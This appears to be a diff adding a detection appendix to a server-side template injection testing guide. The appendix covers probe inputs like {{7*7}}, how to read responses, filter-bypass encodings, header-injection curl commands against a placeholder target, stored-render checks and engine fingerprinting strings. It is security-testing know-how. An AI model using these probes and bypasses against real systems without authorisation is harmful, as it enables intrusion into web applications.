@@ -167,3 +167,147 @@ Go                          → text/template (limited — no user expr eval nor
 
 Stack-detection is a HINT not a fact — confirm with the
 discrimination probes. A Node app can run Jinja via a lib.
+
+
+---
+
+## Detection appendix — the response-analysis details
+
+### What "evaluated" actually looks like
+
+```text
+REQUEST:  ?name={{7*7}}
+RESPONSE: "Hello 49"           → {{7*7}} evaluated — CONFIRMED
+RESPONSE: "Hello {{7*7}}"      → literal echo — not eval'd
+RESPONSE: "Hello 7777777"      → wait — that's '7'*7 — check
+                                  whether you sent '7'*7 (str-mul)
+RESPONSE: "Hello 7*7"          → delimiters stripped — filter ate {{ }}
+RESPONSE: 500                  → engine parsed and errored —
+                                  still evidence of eval-path
+RESPONSE: "Hello "             → swallowed — engine consumed it
+                                  but expr-result suppressed? or
+                                  input-blocked? probe with {{1}}
+```
+
+### The input-consumed test — silent-eval tell
+
+```text
+?name={{1}}     → "Hello "     → the {{1}} was EVALUATED to
+                                 nothing-renderable? or filtered?
+?name=1         → "Hello 1"    → plain text passes → delimiters
+                                 are the trigger → SSTI still
+                                 possible — the {{}} was CONSUMED
+                                 by the parser — the result was ''
+                                 → try {{1+1}} → "Hello 2"? → works
+```
+
+`{{1}}` rendering as `''` isn't a failure — the engine ate it —
+the result just happened to be empty — `{{1+1}}` distinguishes.
+
+### The pre-filter signatures — before the engine
+
+```text
+{{7*7}} → "illegal input"      → input-filter — before engine —
+                                  encode/mutate — sanitizer_fuzz
+{{7*7}} → "invalid characters"  → same — the {{}} rejected
+{{7*7}} → 400                 → request-validation — maybe not
+                                 templated at all
+{{7*7}} → "Hello {{7"          → delimiter-eaten — the }s removed —
+                                  try %7B%7B7*7%7D%7D encoded
+{{7*7}} → "Hello {7*7}"        → ONE brace eaten — single-strip —
+                                  try {{{{7*7}}}} nesting
+```
+
+### The double-render trick — encoding-then-template
+
+```text
+?name=%257B%257B7*7%257D%257D
+   → proxy decodes once → app gets {{7*7}} → renders 49
+   — DOUBLE-url-encoding — when the app url-decodes AFTER the
+     proxy already did → the payload survives one decode-layer
+?name=%7B%7B7*7%7D%7D
+   → single-encode — for apps that DON'T auto-decode the param
+```
+
+### The content-type discrimination
+
+```text
+GET ?name={{7*7}}           → literal
+POST name={{7*7}}           → 49!
+   → the app templates POST-body fields but not GET params —
+     both reach the renderer but only body goes through
+POST {"name":"{{7*7}}"}     → json-body → may also reach it
+   → try content-type switching — the app may pull the field
+     from any content-type it parses
+```
+
+### The header-render check — hidden injection points
+
+```bash
+curl -H 'User-Agent: {{7*7}}' TARGET/      → reflected? then check
+                                            /log /admin /audit
+curl -H 'X-Forwarded-For: {{7*7}}' TARGET/ → ip-logs render
+curl -H 'Referer: http://x/{{7*7}}' TARGET/ → analytics-render
+curl -H 'Cookie: s={{7*7}}' TARGET/        → cookie-render
+```
+
+User-Agent into a log-view = the classic stored-header SSTI —
+the /log or /admin page renders it later.
+
+### The deferred-render check — stored vs reflected
+
+```text
+POST profile.bio={{7*7}} → view /profile → literal?
+   → the render may be at a DIFFERENT endpoint:
+     /admin/users → renders the bio? 49?
+     /invoice     → pdf-render? 49?
+     the welcome-mail → 49 in the email body?
+   → trigger every consumer of the stored field
+```
+
+### The engine-tells inside error-pages
+
+```text
+"jinja2.exceptions.TemplateSyntaxError"    → Jinja2
+"jinja2.exceptions.UndefinedError"          → Jinja2
+"Twig\Error\Syntax" / "Twig_Error_Syntax"   → Twig
+"freemarker.core.ParseException"            → FreeMarker
+"org.apache.velocity.exception"             → Velocity
+"ognl.OgnlException"                        → OGNL
+"org.springframework.expression.spel"       → SpEL
+"ActionView::Template::Error"               → Rails/ERB
+"ejs" / "nunjucks" / "handlebars" in stack   → that engine
+"SmartyCompilerException"                    → Smarty
+"django.template"                            → Django
+"Slim::Parser" / "Temple"                    → Slim
+"pug" / "jade"                              → Pug
+"pebble"                                    → Pebble
+"jinjava"                                   → Jinjava
+"mako" / "MakoException"                    → Mako
+"tornado"                                   → Tornado
+"BeetlException"                            → Beetl
+"Razor"/"cshtml"                            → Razor
+"liquid"/"Liquid::"                          → Liquid
+"ELException"/"JasperException"             → JSP/EL
+"Microsoft JScript"/"VBScript"              → ASP-classic
+"ColdFusion"                                → CFM
+"groovy" / "GroovyRuntimeException"         → Groovy
+"latte"/"Latte"                              → Latte
+"volt"                                      → Volt
+```
+
+### The two-line discriminator cheatsheet
+
+```text
+Jinja2 vs Twig:     {{'a'+'b'}} → 'ab' = jinja, '0' = twig
+Jinja2 vs Nunjucks: {{'a'.upper()}} → 'A' = jinja, err = nunjucks
+                    {{range.constructor.name}} → 'Function' = nunjucks
+EJS vs ERB:         <%= 'a'.upcase %> → 'A' = erb, err = ejs
+                    <%= 'a'.toUpperCase() %> → 'A' = ejs, err = erb
+                    <%= NaN %> → 'NaN' = ejs (ruby has no NaN literal)
+Velocity vs FM:     ${x!''} → silences = FM; $x → quiet-empty = velocity
+                    ${.version} → renders = FM
+Slim vs Pug:        #{RUBY_VERSION} → version = slim; #{process} → pug
+ERB vs JSP:         <%= RUBY_VERSION %> = erb; <%= request.getMethod() %> = jsp
+Thymeleaf vs others: *{} only in th:* attrs — position is the tell
+```
